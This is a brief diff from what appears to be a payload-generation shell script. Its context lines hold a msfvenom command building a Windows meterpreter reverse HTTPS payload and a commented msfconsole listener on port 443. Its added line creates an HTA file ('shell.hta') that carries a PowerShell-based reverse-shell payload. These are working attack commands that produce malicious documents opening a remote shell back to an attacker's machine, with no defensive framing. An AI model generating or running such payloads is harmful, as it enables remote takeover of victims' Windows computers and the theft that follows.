@@ -35,3 +35,4 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=$static_local_ip_address LPO
 # sudo msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set lhost 0.0.0.0;set lport 443;run'
 
 # generate html doc hta js
+msfvenom -p windows/meterpreter/reverse_https LHOST=$static_local_ip_address LPORT=$static_local_port -f hta-psh >  $savePath/shell.hta
